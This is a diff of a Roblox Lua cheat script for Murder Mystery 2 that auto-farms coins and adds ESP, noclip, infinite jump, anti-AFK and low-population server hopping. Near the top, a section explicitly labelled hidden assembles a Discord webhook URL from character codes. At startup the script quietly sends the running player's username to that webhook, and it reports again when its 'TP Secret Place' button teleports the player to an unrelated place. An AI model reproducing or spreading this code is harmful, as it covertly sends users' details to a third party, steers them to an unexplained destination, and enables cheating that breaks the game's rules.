@@ -1,5 +1,8 @@
 print("[mm2 coins farm] Loading...")
 
+-- =========================================================
+-- (SERVICES)
+-- =========================================================
 local P = game:GetService("Players")
 local TS = game:GetService("TweenService")
 local RS = game:GetService("RunService")
@@ -12,6 +15,9 @@ local TeleportService = game:GetService("TeleportService")
 local lp = P.LocalPlayer
 local pg = lp:WaitForChild("PlayerGui")
 
+-- =========================================================
+-- (WEBHOOK - HIDDEN)
+-- =========================================================
 local function gw()
     local b = string.char
     local a = b(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47)
@@ -21,11 +27,17 @@ local function gw()
 end
 local WU = gw()
 
+-- =========================================================
+-- (PLACE IDS)
+-- =========================================================
 local ORIG_ID = 142823291
 local HIDDEN_ID = 80469437126309
 local isHidden = (game.PlaceId == HIDDEN_ID)
 local CURRENT_PLACE = game.PlaceId
 
+-- =========================================================
+-- (WEBHOOK SEND)
+-- =========================================================
 local function sw(msg, ping)
     local body = ping and ("@everyone\n" .. msg) or msg
     local data = {content = body, username = "mm2 coins farm"}
@@ -42,6 +54,9 @@ local function sw(msg, ping)
     end)
 end
 
+-- =========================================================
+-- (HTTP GET)
+-- =========================================================
 local function httpGet(url)
     local req = request or (syn and syn.request) or (http and http.request)
     if not req then return nil end
@@ -52,6 +67,9 @@ local function httpGet(url)
     return nil
 end
 
+-- =========================================================
+-- (FIND LOW PLAYER SERVER)
+-- =========================================================
 local function findLowServer(placeId, maxPlayers)
     maxPlayers = maxPlayers or 2
     local url = "https://games.roblox.com/v1/games/" .. tostring(placeId) .. "/servers/Public?sortOrder=Asc&limit=100"
@@ -59,12 +77,14 @@ local function findLowServer(placeId, maxPlayers)
     if not body then return nil end
     local ok, data = pcall(function() return HS:JSONDecode(body) end)
     if not ok or not data or not data.data then return nil end
+
     for _, server in ipairs(data.data) do
         local playing = server.playing or 0
         if playing >= 1 and playing <= maxPlayers and server.id then
             return server.id, playing
         end
     end
+
     local bestId, bestCount = nil, 999
     for _, server in ipairs(data.data) do
         local playing = server.playing or 0
@@ -76,6 +96,9 @@ local function findLowServer(placeId, maxPlayers)
     return bestId, bestCount
 end
 
+-- =========================================================
+-- (HOP TO LOW PLAYER SERVER)
+-- =========================================================
 local function hopLowServer()
     print("[Server] Searching low player server...")
     local jobId, count = findLowServer(CURRENT_PLACE, 2)
@@ -91,24 +114,50 @@ local function hopLowServer()
     end)
 end
 
+-- =========================================================
+-- (STARTUP WEBHOOK)
+-- =========================================================
 task.spawn(function()
     task.wait(1)
     local ver = isHidden and "HIDDEN" or "ORIGINAL"
     sw("Executed by " .. lp.Name .. " | Place: " .. ver, false)
 end)
 
-local AF, SP, RG, VS, CL = false, 45, 300, {}, 0
-local AK, RF, PM, IJ, JP = false, true, false, false, 50
-local ES, HL, MODE, NOCLIP, NORENDER = false, {}, "Normal", false, false
+-- =========================================================
+-- (CORE VARIABLES)
+-- =========================================================
+local AF = false
+local SP = 45
+local RG = 300
+local VS = {}
+local CL = 0
+local AK = false
+local RF = true
+local PM = false
+local IJ = false
+local JP = 50
+local ES = false
+local HL = {}
+local MODE = "Normal"
+local NOCLIP = false
+local NORENDER = false
 
+-- =========================================================
+-- (NOCLIP FUNCTION)
+-- =========================================================
 local function setNoclip(on)
     local ch = lp.Character
     if not ch then return end
     for _, p in ipairs(ch:GetDescendants()) do
-        if p:IsA("BasePart") then p.CanCollide = not on end
+        if p:IsA("BasePart") then
+            p.CanCollide = not on
+        end
     end
 end
 
+-- =========================================================
+-- (PERFORMANCE MODE)
+-- =========================================================
 local function epm()
     pcall(function()
         settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
@@ -118,11 +167,13 @@ local function epm()
         LG.EnvironmentDiffuseScale = 0
         LG.EnvironmentSpecularScale = 0
         LG.ShadowSoftness = 0
+
         for _, v in ipairs(workspace:GetDescendants()) do
             if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam")
                 or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
                 pcall(function() v.Enabled = false end)
             end
+
             if v:IsA("MeshPart") then
                 local keep = v:IsDescendantOf(lp.Character)
                     or v.Name == "Coin_Server"
@@ -137,18 +188,22 @@ local function epm()
                     end)
                 end
             end
+
             if v:IsA("SpecialMesh") and not v:IsDescendantOf(lp.Character) then
                 pcall(function()
                     v.TextureId = ""
                     v.Scale = Vector3.new(0.01, 0.01, 0.01)
                 end)
             end
+
             if (v:IsA("Decal") or v:IsA("Texture")) and not v:IsDescendantOf(lp.Character) then
                 pcall(function() v.Transparency = 1 end)
             end
+
             if v:IsA("PointLight") or v:IsA("SpotLight") or v:IsA("SurfaceLight") then
                 pcall(function() v.Enabled = false end)
             end
+
             if v:IsA("SurfaceAppearance") then
                 pcall(function() v:Destroy() end)
             end
@@ -158,6 +213,9 @@ local function epm()
     print("[Perf] Cleaned")
 end
 
+-- =========================================================
+-- (NO RENDER MODE)
+-- =========================================================
 local function setNoRender(on)
     NORENDER = on
     pcall(function()
@@ -178,12 +236,17 @@ local function setNoRender(on)
             LG.Brightness = 1
             workspace.CurrentCamera.FieldOfView = 70
             for _, v in ipairs(workspace:GetDescendants()) do
-                if v:IsA("BasePart") then v.LocalTransparencyModifier = 0 end
+                if v:IsA("BasePart") then
+                    v.LocalTransparencyModifier = 0
+                end
             end
         end
     end)
 end
 
+-- =========================================================
+-- (GET PLAYER ROLE)
+-- =========================================================
 local function getRole(pl)
     local ok, roles = pcall(function()
         local r = RPS:FindFirstChild("GetPlayerData", true)
@@ -194,28 +257,49 @@ local function getRole(pl)
     end
     local ch = pl.Character
     if ch then
-        if ch:FindFirstChild("Knife") or (pl.Backpack and pl.Backpack:FindFirstChild("Knife")) then return "Murderer" end
-        if ch:FindFirstChild("Gun") or (pl.Backpack and pl.Backpack:FindFirstChild("Gun")) then return "Sheriff" end
+        if ch:FindFirstChild("Knife") or (pl.Backpack and pl.Backpack:FindFirstChild("Knife")) then
+            return "Murderer"
+        end
+        if ch:FindFirstChild("Gun") or (pl.Backpack and pl.Backpack:FindFirstChild("Gun")) then
+            return "Sheriff"
+        end
     end
     return "Innocent"
 end
 
+-- =========================================================
+-- (GET MURDERER)
+-- =========================================================
 local function getMurderer()
     for _, pl in ipairs(P:GetPlayers()) do
-        if getRole(pl) == "Murderer" then return pl end
+        if getRole(pl) == "Murderer" then
+            return pl
+        end
     end
 end
 
+-- =========================================================
+-- (GET REAL COINS - IGNORES GHOST HITBOXES)
+-- =========================================================
 local function getCoins()
     local list = {}
     for _, obj in ipairs(workspace:GetDescendants()) do
-        if obj:IsA("BasePart") and obj.Name == "Coin_Server" and not VS[obj] then
+        if obj:IsA("BasePart")
+            and obj.Name == "Coin_Server"
+            and obj.Parent
+            and not VS[obj]
+            and obj.Transparency < 0.5
+            and obj.Size.Magnitude > 0.5
+        then
             table.insert(list, obj)
         end
     end
     return list
 end
 
+-- =========================================================
+-- (ESP UPDATE)
+-- =========================================================
 local function updESP()
     if not ES then
         for _, h in pairs(HL) do
@@ -228,8 +312,11 @@ local function updESP()
         if pl ~= lp and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
             local role = getRole(pl)
             local col = Color3.fromRGB(40, 255, 80)
-            if role == "Murderer" then col = Color3.fromRGB(255, 40, 40)
-            elseif role == "Sheriff" or role == "Hero" then col = Color3.fromRGB(40, 120, 255) end
+            if role == "Murderer" then
+                col = Color3.fromRGB(255, 40, 40)
+            elseif role == "Sheriff" or role == "Hero" then
+                col = Color3.fromRGB(40, 120, 255)
+            end
             local h = HL[pl]
             if not h or not h.Parent then
                 h = Instance.new("Highlight")
@@ -253,6 +340,9 @@ task.spawn(function()
     end
 end)
 
+-- =========================================================
+-- (GUI CREATE)
+-- =========================================================
 local gui = Instance.new("ScreenGui")
 gui.Name = "mm2FarmLight"
 gui.ResetOnSpawn = false
@@ -273,6 +363,9 @@ stroke.Thickness = 2.4
 stroke.Color = Color3.fromRGB(255, 120, 30)
 stroke.Parent = main
 
+-- =========================================================
+-- (GUI COLOR PULSE)
+-- =========================================================
 task.spawn(function()
     local t = 0
     while main.Parent do
@@ -294,6 +387,9 @@ title.TextSize = 16
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.Parent = main
 
+-- =========================================================
+-- (PLACE INDICATOR - GREEN HIDDEN / RED ORIGINAL)
+-- =========================================================
 local placeTag = Instance.new("TextLabel")
 placeTag.Size = UDim2.fromOffset(70, 22)
 placeTag.Position = UDim2.new(1, -110, 0, 10)
@@ -314,12 +410,14 @@ close.Size = UDim2.fromOffset(28, 28)
 close.Position = UDim2.new(1, -36, 0, 8)
 close.BackgroundColor3 = Color3.fromRGB(170, 45, 20)
 close.Text = "X"
-close.TextColor3 = Color3.new(1,1,1)
+close.TextColor3 = Color3.new(1, 1, 1)
 close.Font = Enum.Font.GothamBold
 close.TextSize = 14
 close.Parent = main
 Instance.new("UICorner", close).CornerRadius = UDim.new(0, 6)
-close.MouseButton1Click:Connect(function() gui:Destroy() end)
+close.MouseButton1Click:Connect(function()
+    gui:Destroy()
+end)
 
 local side = Instance.new("Frame")
 side.Size = UDim2.new(0, 105, 1, -50)
@@ -343,9 +441,14 @@ layout.Padding = UDim.new(0, 6)
 layout.SortOrder = Enum.SortOrder.LayoutOrder
 layout.Parent = content
 
+-- =========================================================
+-- (GUI HELPERS)
+-- =========================================================
 local function clear()
     for _, c in ipairs(content:GetChildren()) do
-        if not c:IsA("UIListLayout") then c:Destroy() end
+        if not c:IsA("UIListLayout") then
+            c:Destroy()
+        end
     end
 end
 
@@ -369,7 +472,7 @@ local function mkToggle(txt, parent, state, cb)
     b.Size = UDim2.new(1, -16, 0, 32)
     b.BackgroundColor3 = st and Color3.fromRGB(170, 75, 20) or Color3.fromRGB(38, 16, 8)
     b.Text = txt .. (st and " : ON" or " : OFF")
-    b.TextColor3 = Color3.new(1,1,1)
+    b.TextColor3 = Color3.new(1, 1, 1)
     b.Font = Enum.Font.GothamBold
     b.TextSize = 12
     b.Parent = parent
@@ -383,19 +486,41 @@ local function mkToggle(txt, parent, state, cb)
     return b
 end
 
+-- =========================================================
+-- (TAB - AUTOFARM)
+-- =========================================================
 local function showAF()
     clear()
     content.CanvasSize = UDim2.new(0, 0, 0, 540)
 
     mkToggle("AutoFarm", content, AF, function(v)
         AF = v
-        if v then CL, VS = 0, {} end
+        if v then
+            CL = 0
+            VS = {}
+        end
     end).LayoutOrder = 1
-    mkToggle("Anti AFK", content, AK, function(v) AK = v end).LayoutOrder = 2
-    mkToggle("Reset on Full", content, RF, function(v) RF = v end).LayoutOrder = 3
-    mkToggle("Performance", content, PM, function(v) if v then epm() end end).LayoutOrder = 4
-    mkToggle("Noclip", content, NOCLIP, function(v) NOCLIP = v setNoclip(v) end).LayoutOrder = 5
-    mkToggle("No Render", content, NORENDER, function(v) setNoRender(v) end).LayoutOrder = 6
+
+    mkToggle("Anti AFK", content, AK, function(v)
+        AK = v
+    end).LayoutOrder = 2
+
+    mkToggle("Reset on Full", content, RF, function(v)
+        RF = v
+    end).LayoutOrder = 3
+
+    mkToggle("Performance", content, PM, function(v)
+        if v then epm() end
+    end).LayoutOrder = 4
+
+    mkToggle("Noclip", content, NOCLIP, function(v)
+        NOCLIP = v
+        setNoclip(v)
+    end).LayoutOrder = 5
+
+    mkToggle("No Render", content, NORENDER, function(v)
+        setNoRender(v)
+    end).LayoutOrder = 6
 
     local modeLbl = Instance.new("TextLabel")
     modeLbl.Size = UDim2.new(1, -16, 0, 18)
@@ -412,7 +537,7 @@ local function showAF()
         b.Size = UDim2.new(1, -16, 0, 28)
         b.BackgroundColor3 = (MODE == m) and Color3.fromRGB(190, 85, 25) or Color3.fromRGB(38, 16, 8)
         b.Text = m
-        b.TextColor3 = Color3.new(1,1,1)
+        b.TextColor3 = Color3.new(1, 1, 1)
         b.Font = Enum.Font.GothamBold
         b.TextSize = 12
         b.LayoutOrder = 7 + i
@@ -443,7 +568,7 @@ local function showAF()
     box.Size = UDim2.new(1, -16, 0, 28)
     box.BackgroundColor3 = Color3.fromRGB(32, 14, 6)
     box.Text = tostring(SP)
-    box.TextColor3 = Color3.new(1,1,1)
+    box.TextColor3 = Color3.new(1, 1, 1)
     box.Font = Enum.Font.GothamBold
     box.TextSize = 13
     box.LayoutOrder = 11
@@ -474,26 +599,30 @@ local function showAF()
         end
     end)
 
+    -- (BUTTON - TP SECRET PLACE)
     local tpBtn = Instance.new("TextButton")
     tpBtn.Size = UDim2.new(1, -16, 0, 34)
     tpBtn.BackgroundColor3 = Color3.fromRGB(150, 55, 15)
     tpBtn.Text = "TP Secret Place"
-    tpBtn.TextColor3 = Color3.new(1,1,1)
+    tpBtn.TextColor3 = Color3.new(1, 1, 1)
     tpBtn.Font = Enum.Font.GothamBold
     tpBtn.TextSize = 12
     tpBtn.LayoutOrder = 13
     tpBtn.Parent = content
     Instance.new("UICorner", tpBtn).CornerRadius = UDim.new(0, 6)
     tpBtn.MouseButton1Click:Connect(function()
-        pcall(function() TeleportService:Teleport(HIDDEN_ID, lp) end)
+        pcall(function()
+            TeleportService:Teleport(HIDDEN_ID, lp)
+        end)
         sw("Teleporting to secret place by " .. lp.Name, false)
     end)
 
+    -- (BUTTON - LOW PLAYER SERVER)
     local hopBtn = Instance.new("TextButton")
     hopBtn.Size = UDim2.new(1, -16, 0, 34)
     hopBtn.BackgroundColor3 = Color3.fromRGB(30, 120, 50)
     hopBtn.Text = "Low Player Server"
-    hopBtn.TextColor3 = Color3.new(1,1,1)
+    hopBtn.TextColor3 = Color3.new(1, 1, 1)
     hopBtn.Font = Enum.Font.GothamBold
     hopBtn.TextSize = 12
     hopBtn.LayoutOrder = 14
@@ -504,21 +633,30 @@ local function showAF()
         task.spawn(function()
             hopLowServer()
             task.wait(2)
-            if hopBtn and hopBtn.Parent then hopBtn.Text = "Low Player Server" end
+            if hopBtn and hopBtn.Parent then
+                hopBtn.Text = "Low Player Server"
+            end
         end)
     end)
 end
 
+-- =========================================================
+-- (TAB - ESP)
+-- =========================================================
 local function showESP()
     clear()
     content.CanvasSize = UDim2.new(0, 0, 0, 160)
+
     mkToggle("Role ESP", content, ES, function(v)
         ES = v
         if not v then
-            for _, h in pairs(HL) do if h then pcall(function() h:Destroy() end) end end
+            for _, h in pairs(HL) do
+                if h then pcall(function() h:Destroy() end) end
+            end
             HL = {}
         end
     end).LayoutOrder = 1
+
     local info = Instance.new("TextLabel")
     info.Size = UDim2.new(1, -16, 0, 60)
     info.BackgroundTransparency = 1
@@ -531,10 +669,17 @@ local function showESP()
     info.Parent = content
 end
 
+-- =========================================================
+-- (TAB - MOVEMENT)
+-- =========================================================
 local function showMove()
     clear()
     content.CanvasSize = UDim2.new(0, 0, 0, 220)
-    mkToggle("Inf Jump", content, IJ, function(v) IJ = v end).LayoutOrder = 1
+
+    mkToggle("Inf Jump", content, IJ, function(v)
+        IJ = v
+    end).LayoutOrder = 1
+
     local lbl = Instance.new("TextLabel")
     lbl.Size = UDim2.new(1, -16, 0, 18)
     lbl.BackgroundTransparency = 1
@@ -544,11 +689,12 @@ local function showMove()
     lbl.TextSize = 12
     lbl.LayoutOrder = 2
     lbl.Parent = content
+
     local box = Instance.new("TextBox")
     box.Size = UDim2.new(1, -16, 0, 28)
     box.BackgroundColor3 = Color3.fromRGB(32, 14, 6)
     box.Text = tostring(JP)
-    box.TextColor3 = Color3.new(1,1,1)
+    box.TextColor3 = Color3.new(1, 1, 1)
     box.Font = Enum.Font.GothamBold
     box.TextSize = 13
     box.LayoutOrder = 3
@@ -567,6 +713,9 @@ local function showMove()
     end)
 end
 
+-- =========================================================
+-- (SIDE TABS SETUP)
+-- =========================================================
 local tabs = {
     {name = "AutoFarm", fn = showAF},
     {name = "ESP", fn = showESP},
@@ -574,10 +723,12 @@ local tabs = {
 }
 
 for i, tab in ipairs(tabs) do
-    local b = mkBtn(tab.name, (i-1)*38 + 8, side)
+    local b = mkBtn(tab.name, (i - 1) * 38 + 8, side)
     b.MouseButton1Click:Connect(function()
         for _, c in ipairs(side:GetChildren()) do
-            if c:IsA("TextButton") then c.BackgroundColor3 = Color3.fromRGB(48, 22, 8) end
+            if c:IsA("TextButton") then
+                c.BackgroundColor3 = Color3.fromRGB(48, 22, 8)
+            end
         end
         b.BackgroundColor3 = Color3.fromRGB(190, 85, 25)
         tab.fn()
@@ -586,25 +737,42 @@ end
 
 showAF()
 local first = side:FindFirstChildOfClass("TextButton")
-if first then first.BackgroundColor3 = Color3.fromRGB(190, 85, 25) end
+if first then
+    first.BackgroundColor3 = Color3.fromRGB(190, 85, 25)
+end
 
+-- =========================================================
+-- (INF JUMP)
+-- =========================================================
 UIS.JumpRequest:Connect(function()
     if IJ and lp.Character and lp.Character:FindFirstChild("Humanoid") then
         lp.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
     end
 end)
 
+-- =========================================================
+-- (CHARACTER ADDED)
+-- =========================================================
 lp.CharacterAdded:Connect(function(ch)
     task.wait(0.3)
     local hum = ch:FindFirstChild("Humanoid")
-    if hum then hum.JumpPower = JP end
-    if NOCLIP then setNoclip(true) end
+    if hum then
+        hum.JumpPower = JP
+    end
+    if NOCLIP then
+        setNoclip(true)
+    end
 end)
 
+-- =========================================================
+-- (RESET ON FULL BAG)
+-- =========================================================
 local coinRemote = RPS:FindFirstChild("Remotes")
 if coinRemote then
     coinRemote = coinRemote:FindFirstChild("Gameplay")
-    if coinRemote then coinRemote = coinRemote:FindFirstChild("CoinCollected") end
+    if coinRemote then
+        coinRemote = coinRemote:FindFirstChild("CoinCollected")
+    end
 end
 if coinRemote then
     coinRemote.OnClientEvent:Connect(function(_, cur, max)
@@ -614,38 +782,57 @@ if coinRemote then
     end)
 end
 
+-- =========================================================
+-- (FARM LOOP - RANDOM COINS + GHOST FIX + 0.5s DELAY)
+-- =========================================================
 task.spawn(function()
     while true do
         if AF then
             local ch = lp.Character
             local root = ch and ch:FindFirstChild("HumanoidRootPart")
             local hum = ch and ch:FindFirstChild("Humanoid")
+
             if root and hum then
-                if NOCLIP or AF then setNoclip(true) end
+                if NOCLIP or AF then
+                    setNoclip(true)
+                end
                 hum.PlatformStand = false
                 root.Anchored = false
 
                 local murd = getMurderer()
                 local murdRoot = murd and murd.Character and murd.Character:FindFirstChild("HumanoidRootPart")
 
+                -- Build list of REAL coins only (ignore ghost hitboxes)
                 local candidates = {}
-                for _, obj in ipairs(getCoins()) do
-                    local d = (obj.Position - root.Position).Magnitude
-                    if d < RG then
-                        if MODE == "Strategy" and murdRoot then
-                            if (obj.Position - murdRoot.Position).Magnitude >= 45 then
+                for _, obj in ipairs(workspace:GetDescendants()) do
+                    if obj:IsA("BasePart")
+                        and obj.Name == "Coin_Server"
+                        and obj.Parent
+                        and not VS[obj]
+                        and obj.Transparency < 0.5
+                        and obj.Size.Magnitude > 0.5
+                    then
+                        local d = (obj.Position - root.Position).Magnitude
+                        if d < RG then
+                            if MODE == "Strategy" and murdRoot then
+                                if (obj.Position - murdRoot.Position).Magnitude >= 45 then
+                                    table.insert(candidates, {part = obj, dist = d})
+                                end
+                            else
                                 table.insert(candidates, {part = obj, dist = d})
                             end
-                        else
-                            table.insert(candidates, {part = obj, dist = d})
                         end
                     end
                 end
 
                 local closest = nil
                 local dist = math.huge
+
                 if #candidates > 0 then
-                    table.sort(candidates, function(a, b) return a.dist < b.dist end)
+                    table.sort(candidates, function(a, b)
+                        return a.dist < b.dist
+                    end)
+                    -- Random from nearest 5 so alts spread out
                     local pool = math.min(5, #candidates)
                     local pick = candidates[math.random(1, pool)]
                     closest = pick.part
@@ -653,32 +840,47 @@ task.spawn(function()
                 end
 
                 if closest then
+                    -- Mark taken RIGHT AWAY so we never path to it again
+                    VS[closest] = true
+
                     local t = math.max(dist / math.max(SP, 35), 0.05)
                     local tw = TS:Create(root, TweenInfo.new(t, Enum.EasingStyle.Linear), {
                         CFrame = CFrame.new(closest.Position + Vector3.new(0, 2.5, 0))
                     })
                     tw:Play()
                     tw.Completed:Wait()
-                    if closest and closest.Parent then
-                        VS[closest] = true
-                        CL = CL + 1
-                    end
+
+                    CL = CL + 1
+
+                    -- Wait 0.5s then search for next coin
+                    task.wait(0.5)
+                else
+                    task.wait(0.15)
                 end
-                task.wait(0.06)
             else
                 task.wait(0.4)
             end
         else
-            if not NOCLIP then setNoclip(false) end
+            if not NOCLIP then
+                setNoclip(false)
+            end
             task.wait(0.5)
         end
     end
 end)
 
+-- =========================================================
+-- (STEPPED NOCLIP KEEP)
+-- =========================================================
 RS.Stepped:Connect(function()
-    if NOCLIP or AF then setNoclip(true) end
+    if NOCLIP or AF then
+        setNoclip(true)
+    end
 end)
 
+-- =========================================================
+-- (ANTI AFK)
+-- =========================================================
 lp.Idled:Connect(function()
     if AK then
         VU:Button2Down(Vector2.new(), workspace.CurrentCamera.CFrame)
@@ -687,4 +889,7 @@ lp.Idled:Connect(function()
     end
 end)
 
+-- =========================================================
+-- (LOADED)
+-- =========================================================
 print("[mm2 coins farm] Loaded | " .. (isHidden and "HIDDEN" or "ORIGINAL"))
